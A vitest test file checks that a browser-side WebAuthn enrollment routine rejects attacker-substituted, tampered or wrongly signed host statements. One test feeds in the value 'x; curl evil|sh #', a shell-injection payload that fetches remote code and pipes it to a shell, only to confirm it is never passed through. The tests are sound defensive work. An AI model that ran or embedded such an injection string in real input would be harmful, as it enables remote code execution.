import "fake-indexeddb/auto";
import { beforeEach, describe, expect, it, vi } from "vitest";
import fixture from "./fixtures/host_enrollment.json";
import { fromBase64Url } from "./hostAuth";
import { finishEnrollment } from "./hostControl";
import { registrationDigest } from "./hostStatements";
import { parseDescriptor, type PinnedHost } from "./hostStatements";

// Native-generated: the production host signed every statement here.
type Raw = { rawId: string; attestationObject: string; clientDataJSON: string };
type Resp = {
  id: string;
  rawId: string;
  type: string;
  response: Record<string, string>;
};
const F = fixture as unknown as {
  host_pub: string;
  other_host_pub: string;
  challenge: string;
  nonce: string;
  options: unknown;
  honest: { response: Resp; raw: Raw };
  attacker: { response: Resp; raw: Raw };
  same_raw_id: { statement: unknown; raw: Raw; response: Resp };
  statements: Record<string, unknown>;
};

const buf = (b64u: string) => fromBase64Url(b64u).buffer;
let host: PinnedHost;

function authenticator(resp: Resp) {
  vi.stubGlobal("PublicKeyCredential", class {});
  vi.stubGlobal("navigator", {
    ...navigator,
    credentials: {
      create: vi.fn(async () => ({
        id: resp.id,
        rawId: buf(resp.rawId),
        type: resp.type,
        response: {
          attestationObject: buf(resp.response.attestationObject),
          clientDataJSON: buf(resp.response.clientDataJSON),
        },
        getClientExtensionResults: () => ({}),
      })),
    },
  });
}

/** The relay answers with `statement`, echoing a chosen nonce when asked. */
function relayReturns(statement: unknown, seen: { nonce?: string } = {}) {
  vi.stubGlobal(
    "fetch",
    vi.fn(async (_url: string, init: RequestInit) => {
      seen.nonce = JSON.parse(init.body as string).nonce;
      return new Response(JSON.stringify({ type: "registered", statement }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }),
  );
}

const run = (h = host) =>
  finishEnrollment(h, F.challenge, F.options).then(
    (id) => ({ id }),
    (error: Error) => ({ error }),
  );

beforeEach(async () => {
  host = await parseDescriptor("chd1." + F.host_pub);
  // The fixture nonce is fixed; make the browser draw exactly it.
  const hex = F.nonce.match(/../g)!.map((h) => parseInt(h, 16));
  vi.spyOn(crypto, "getRandomValues").mockImplementation(((a: Uint8Array) => {
    a.set(hex.slice(0, a.length));
    return a;
  }) as never);
});

describe("host-signed enrollment completion", () => {
  it("accepts the honest registration and returns the browser-derived id", async () => {
    authenticator(F.honest.response);
    relayReturns(F.statements.honest);
    const out = await run();
    expect(out).toHaveProperty("id");
    expect((out as { id: string }).id).toMatch(/^[A-Za-z0-9_-]{43}$/);
  });

  it("rejects a valid attacker registration the relay substituted", async () => {
    authenticator(F.honest.response);
    relayReturns(F.statements.attacker);
    const out = await run();
    expect(out).toHaveProperty("error");
  });

  it("rejects same rawId but a different key/attestation", async () => {
    authenticator(F.honest.response);
    relayReturns(F.same_raw_id.statement);
    const out = await run();
    expect(out).toHaveProperty("error");
    // The host's own id for it is identical, so only the digest tells them apart.
    expect(F.same_raw_id.raw.rawId).toBe(F.honest.raw.rawId);
    expect(await registrationDigest(toParts(F.same_raw_id.raw))).not.toBe(
      await registrationDigest(toParts(F.honest.raw)),
    );
  });

  it.each(["other_nonce", "other_ceremony", "other_host"])(
    "rejects the %s statement",
    async (name) => {
      authenticator(F.honest.response);
      relayReturns(F.statements[name]);
      expect(await run()).toHaveProperty("error");
    },
  );

  it("rejects a statement signed by a different key than the pinned host", async () => {
    authenticator(F.honest.response);
    relayReturns(F.statements.honest);
    const other = await parseDescriptor("chd1." + F.other_host_pub);
    expect(await run(other)).toHaveProperty("error");
  });

  it("rejects a tampered digest or payload", async () => {
    authenticator(F.honest.response);
    const s = F.statements.honest as { p: string; s: string };
    const payload = JSON.parse(atob(s.p.replace(/-/g, "+").replace(/_/g, "/")));
    payload.response_sha256 = "A".repeat(43);
    const p = btoa(JSON.stringify(payload))
      .replace(/\+/g, "-")
      .replace(/\//g, "_")
      .replace(/=+$/, "");
    relayReturns({ p, s: s.s });
    expect(await run()).toHaveProperty("error");
  });

  it("never returns relay text such as a shell-metacharacter id", async () => {
    authenticator(F.honest.response);
    const evil = "x; curl evil|sh #";
    vi.stubGlobal(
      "fetch",
      vi.fn(
        async () =>
          new Response(JSON.stringify({ type: "registered", cred_id: evil }), {
            status: 200,
            headers: { "Content-Type": "application/json" },
          }),
      ),
    );
    const out = await run();
    expect(out).toHaveProperty("error");
    expect(JSON.stringify(out)).not.toContain("curl");
  });
});

function toParts(raw: Raw) {
  return {
    rawId: fromBase64Url(raw.rawId),
    attestationObject: fromBase64Url(raw.attestationObject),
    clientDataJSON: fromBase64Url(raw.clientDataJSON),
  };
}
